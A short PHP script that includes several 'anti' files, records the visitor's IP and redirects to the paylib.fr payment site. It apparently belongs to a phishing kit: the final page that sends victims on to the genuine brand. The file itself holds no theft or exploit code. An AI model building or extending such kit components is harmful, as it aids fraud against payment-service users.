<?php

session_start();

include '../anti/anti1.php';
include '../anti/anti15.php';
include '../anti/anti2.php';
include '../anti/anti3.php';


$ip = getenv("REMOTE_ADDR");



HEADER("Location: https://www.paylib.fr/");


?>

